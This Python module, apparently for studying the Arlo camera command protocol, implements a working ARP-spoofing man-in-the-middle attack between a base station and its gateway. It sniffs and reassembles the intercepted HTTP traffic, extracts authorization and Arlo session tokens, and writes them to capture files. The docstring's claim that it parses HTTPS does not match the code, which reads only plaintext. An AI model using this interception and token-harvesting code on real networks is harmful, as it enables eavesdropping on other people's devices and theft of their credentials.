"""
Traffic interceptor for Arlo command protocol analysis.
Uses ARP spoofing to MITM between the Arlo app (phone) and the base station,
then parses HTTPS traffic to extract auth tokens, command formats, and PTZ payloads.
"""

import os
import json
import time
import logging
import threading
import ssl
import re
from typing import Optional, Callable
from dataclasses import dataclass, field
from datetime import datetime

from scapy.all import (
    ARP, Ether, IP, TCP, Raw,
    sendp, sniff as scapy_sniff,
    getmacbyip, get_if_hwaddr, conf
)

logger = logging.getLogger(__name__)


@dataclass
class CapturedCommand:
    """A captured Arlo command from intercepted traffic."""
    timestamp: float
    method: str              # GET, POST, PUT
    path: str                # API endpoint path
    headers: dict = field(default_factory=dict)
    body: Optional[dict] = None
    response_status: int = 0
    response_body: Optional[dict] = None
    source_ip: str = ""
    dest_ip: str = ""

    @property
    def is_ptz(self) -> bool:
        """Check if this is a PTZ-related command."""
        ptz_indicators = [
            "position", "ptz", "pan", "tilt", "zoom",
            "move", "preset", "patrol", "direction",
            "action/set", "motor",
        ]
        path_lower = self.path.lower()
        if any(ind in path_lower for ind in ptz_indicators):
            return True
        if self.body:
            body_str = json.dumps(self.body).lower()
            if any(ind in body_str for ind in ptz_indicators):
                return True
        return False

    @property
    def is_auth(self) -> bool:
        """Check if this contains auth tokens."""
        if "authorization" in {k.lower() for k in self.headers}:
            return True
        if "token" in self.path.lower() or "login" in self.path.lower():
            return True
        return False

    def to_dict(self) -> dict:
        return {
            "timestamp": self.timestamp,
            "method": self.method,
            "path": self.path,
            "headers": self.headers,
            "body": self.body,
            "response_status": self.response_status,
            "response_body": self.response_body,
            "source_ip": self.source_ip,
            "dest_ip": self.dest_ip,
        }


class ARPInterceptor:
    """
    ARP-based MITM to intercept traffic between the Arlo app and base station.
    Positions us in the middle so we can see the command traffic.
    """

    def __init__(
        self,
        base_station_ip: str,
        interface: Optional[str] = None,
        gateway_ip: Optional[str] = None,
    ):
        self.base_station_ip = base_station_ip
        self.interface = interface or str(conf.iface)
        self.gateway_ip = gateway_ip or conf.route.route("0.0.0.0")[2]

        self._running = False
        self._spoof_thread: Optional[threading.Thread] = None

        # Resolve MACs
        self.our_mac = get_if_hwaddr(self.interface)
        self.gateway_mac = getmacbyip(self.gateway_ip)
        self.base_mac = getmacbyip(self.base_station_ip)

        if not self.gateway_mac:
            raise RuntimeError(f"Cannot resolve gateway MAC: {self.gateway_ip}")
        if not self.base_mac:
            raise RuntimeError(f"Cannot resolve base station MAC: {self.base_station_ip}")

        self._forwarding_was_enabled = False

    def _enable_forwarding(self):
        import platform
        system = platform.system()
        try:
            if system == "Darwin":
                result = os.popen("sysctl -n net.inet.ip.forwarding").read().strip()
                self._forwarding_was_enabled = result == "1"
                if not self._forwarding_was_enabled:
                    os.system("sysctl -w net.inet.ip.forwarding=1")
            elif system == "Linux":
                with open("/proc/sys/net/ipv4/ip_forward") as f:
                    self._forwarding_was_enabled = f.read().strip() == "1"
                if not self._forwarding_was_enabled:
                    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                        f.write("1")
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {e}. Run with sudo.")

    def _disable_forwarding(self):
        if self._forwarding_was_enabled:
            return
        import platform
        system = platform.system()
        try:
            if system == "Darwin":
                os.system("sysctl -w net.inet.ip.forwarding=0")
            elif system == "Linux":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("0")
        except Exception:
            pass

    def _poison(self):
        """Send ARP poison to position ourselves between app and base station."""
        # Tell base station: gateway is us (captures outbound traffic)
        sendp(
            Ether(dst=self.base_mac, src=self.our_mac) /
            ARP(op=2, pdst=self.base_station_ip, hwdst=self.base_mac,
                psrc=self.gateway_ip, hwsrc=self.our_mac),
            iface=self.interface, verbose=False,
        )
        # Tell gateway: base station is us (captures inbound traffic)
        sendp(
            Ether(dst=self.gateway_mac, src=self.our_mac) /
            ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                psrc=self.base_station_ip, hwsrc=self.our_mac),
            iface=self.interface, verbose=False,
        )

    def _restore(self):
        """Restore correct ARP entries."""
        for _ in range(3):
            sendp(
                Ether(dst=self.base_mac, src=self.gateway_mac) /
                ARP(op=2, pdst=self.base_station_ip, hwdst=self.base_mac,
                    psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                iface=self.interface, verbose=False,
            )
            sendp(
                Ether(dst=self.gateway_mac, src=self.base_mac) /
                ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                    psrc=self.base_station_ip, hwsrc=self.base_mac),
                iface=self.interface, verbose=False,
            )
            time.sleep(0.5)

    def _spoof_loop(self):
        while self._running:
            try:
                self._poison()
            except Exception as e:
                logger.error(f"ARP spoof error: {e}")
            time.sleep(2)

    def start(self):
        if self._running:
            return
        self._enable_forwarding()
        self._running = True
        self._spoof_thread = threading.Thread(
            target=self._spoof_loop, daemon=True, name="arp-intercept"
        )
        self._spoof_thread.start()
        logger.info(
            f"ARP intercept started: base={self.base_station_ip} "
            f"gw={self.gateway_ip}"
        )

    def stop(self):
        if not self._running:
            return
        self._running = False
        if self._spoof_thread:
            self._spoof_thread.join(timeout=5)
        self._restore()
        self._disable_forwarding()
        logger.info("ARP intercept stopped, network restored")


class CommandSniffer:
    """
    Sniffs traffic to/from the Arlo base station and reconstructs
    HTTP requests/responses to extract command payloads.
    """

    def __init__(
        self,
        base_station_ip: str,
        interface: Optional[str] = None,
        capture_dir: str = "./captures",
        on_command: Optional[Callable[[CapturedCommand], None]] = None,
    ):
        self.base_station_ip = base_station_ip
        self.interface = interface or str(conf.iface)
        self.capture_dir = capture_dir
        self.on_command = on_command

        self._running = False
        self._sniff_thread: Optional[threading.Thread] = None

        # TCP stream reassembly buffers: (src_ip, src_port, dst_ip, dst_port) -> bytes
        self._streams: dict[tuple, bytearray] = {}

        # Extracted data
        self.commands: list[CapturedCommand] = []
        self.auth_tokens: list[str] = []
        self.ptz_commands: list[CapturedCommand] = []

        os.makedirs(capture_dir, exist_ok=True)

    def _packet_handler(self, pkt):
        """Process each captured packet."""
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        ip_layer = pkt[IP]
        tcp_layer = pkt[TCP]
        payload = bytes(pkt[Raw].load)

        src = ip_layer.src
        dst = ip_layer.dst

        # Only care about traffic to/from the base station
        if src != self.base_station_ip and dst != self.base_station_ip:
            return

        # Reassemble TCP stream
        stream_key = (src, tcp_layer.sport, dst, tcp_layer.dport)
        if stream_key not in self._streams:
            self._streams[stream_key] = bytearray()
        self._streams[stream_key].extend(payload)

        # Try to parse as HTTP
        self._try_parse_http(stream_key)

    def _try_parse_http(self, stream_key: tuple):
        """Attempt to parse accumulated stream data as HTTP."""
        data = self._streams[stream_key]
        text = data.decode("utf-8", errors="replace")

        # Check for HTTP request
        http_req = re.match(
            r'^(GET|POST|PUT|PATCH|DELETE|OPTIONS)\s+(\S+)\s+HTTP/1\.[01]\r\n',
            text
        )

        # Check for HTTP response
        http_resp = re.match(r'^HTTP/1\.[01]\s+(\d+)', text)

        if http_req:
            self._parse_request(stream_key, text)
        elif http_resp:
            self._parse_response(stream_key, text)

    def _parse_request(self, stream_key: tuple, text: str):
        """Parse an HTTP request from stream data."""
        # Need complete headers at minimum
        if "\r\n\r\n" not in text:
            return

        header_part, body_part = text.split("\r\n\r\n", 1)
        lines = header_part.split("\r\n")

        # Parse request line
        match = re.match(r'^(GET|POST|PUT|PATCH|DELETE)\s+(\S+)', lines[0])
        if not match:
            return

        method, path = match.group(1), match.group(2)

        # Parse headers
        headers = {}
        content_length = 0
        for line in lines[1:]:
            if ":" in line:
                key, val = line.split(":", 1)
                headers[key.strip()] = val.strip()
                if key.strip().lower() == "content-length":
                    try:
                        content_length = int(val.strip())
                    except ValueError:
                        pass

        # Check if we have the full body
        if content_length > 0 and len(body_part) < content_length:
            return  # Wait for more data

        # Parse body
        body = None
        if body_part.strip():
            try:
                body = json.loads(body_part.strip())
            except (json.JSONDecodeError, ValueError):
                body = {"raw": body_part.strip()}

        cmd = CapturedCommand(
            timestamp=time.time(),
            method=method,
            path=path,
            headers=headers,
            body=body,
            source_ip=stream_key[0],
            dest_ip=stream_key[2],
        )

        self._process_command(cmd)

        # Clear the stream buffer
        self._streams[stream_key] = bytearray()

    def _parse_response(self, stream_key: tuple, text: str):
        """Parse an HTTP response — match to the most recent request."""
        if "\r\n\r\n" not in text:
            return

        header_part, body_part = text.split("\r\n\r\n", 1)
        lines = header_part.split("\r\n")

        match = re.match(r'^HTTP/1\.[01]\s+(\d+)', lines[0])
        if not match:
            return

        status = int(match.group(1))

        # Try to associate with the last command
        if self.commands:
            last_cmd = self.commands[-1]
            last_cmd.response_status = status

            if body_part.strip():
                try:
                    last_cmd.response_body = json.loads(body_part.strip())
                except (json.JSONDecodeError, ValueError):
                    pass

            # Re-check for PTZ data in response
            if last_cmd.response_body and last_cmd.is_ptz:
                self._extract_ptz_info(last_cmd)

        self._streams[stream_key] = bytearray()

    def _process_command(self, cmd: CapturedCommand):
        """Process a captured command — extract tokens, identify PTZ, etc."""
        self.commands.append(cmd)

        # Extract auth tokens
        for key, val in cmd.headers.items():
            if key.lower() == "authorization":
                token = val.replace("Bearer ", "").strip()
                if token and token not in self.auth_tokens:
                    self.auth_tokens.append(token)
                    logger.info(f"Captured auth token: {token[:20]}...")

            # Arlo uses custom auth headers too
            if key.lower() in ("x-arlo-token", "token"):
                if val and val not in self.auth_tokens:
                    self.auth_tokens.append(val)
                    logger.info(f"Captured Arlo token: {val[:20]}...")

        # Identify PTZ commands
        if cmd.is_ptz:
            self.ptz_commands.append(cmd)
            logger.info(f"PTZ command captured: {cmd.method} {cmd.path}")
            if cmd.body:
                logger.info(f"  Payload: {json.dumps(cmd.body, indent=2)}")

        # Notify callback
        if self.on_command:
            self.on_command(cmd)

        # Log command
        label = "PTZ" if cmd.is_ptz else "AUTH" if cmd.is_auth else "CMD"
        logger.debug(f"[{label}] {cmd.method} {cmd.path}")

    def _extract_ptz_info(self, cmd: CapturedCommand):
        """Extract PTZ parameters from a command's response."""
        resp = cmd.response_body
        if not resp:
            return

        # Look for position data in various Arlo response formats
        for key in ["properties", "data", "result"]:
            if key in resp and isinstance(resp[key], dict):
                props = resp[key]
                if any(k in props for k in ["pan", "tilt", "zoom", "position"]):
                    logger.info(f"  PTZ position data: {json.dumps(props)}")

    def _sniff_loop(self):
        """Main sniffing loop."""
        bpf = f"host {self.base_station_ip} and tcp"
        logger.info(f"Sniffing Arlo traffic (filter: {bpf})...")

        scapy_sniff(
            filter=bpf,
            iface=self.interface,
            prn=self._packet_handler,
            store=False,
            stop_filter=lambda _: not self._running,
        )

    def start(self):
        if self._running:
            return
        self._running = True
        self._sniff_thread = threading.Thread(
            target=self._sniff_loop, daemon=True, name="cmd-sniffer"
        )
        self._sniff_thread.start()
        logger.info("Command sniffer started")

    def stop(self):
        self._running = False
        if self._sniff_thread:
            self._sniff_thread.join(timeout=5)
        logger.info(
            f"Command sniffer stopped. "
            f"Captured {len(self.commands)} commands, "
            f"{len(self.ptz_commands)} PTZ, "
            f"{len(self.auth_tokens)} tokens"
        )

    def save_captures(self, path: Optional[str] = None):
        """Save all captured commands to a JSON file."""
        if not path:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.capture_dir, f"arlo_commands_{ts}.json")

        data = {
            "captured_at": datetime.now().isoformat(),
            "base_station_ip": self.base_station_ip,
            "auth_tokens": self.auth_tokens,
            "total_commands": len(self.commands),
            "ptz_commands": [cmd.to_dict() for cmd in self.ptz_commands],
            "all_commands": [cmd.to_dict() for cmd in self.commands],
        }

        with open(path, "w") as f:
            json.dump(data, f, indent=2)

        logger.info(f"Saved {len(self.commands)} commands to {path}")
        return path

    def get_latest_token(self) -> Optional[str]:
        """Return the most recently captured auth token."""
        return self.auth_tokens[-1] if self.auth_tokens else None

    @property
    def stats(self) -> dict:
        return {
            "total_commands": len(self.commands),
            "ptz_commands": len(self.ptz_commands),
            "auth_tokens": len(self.auth_tokens),
            "active_streams": len(self._streams),
        }
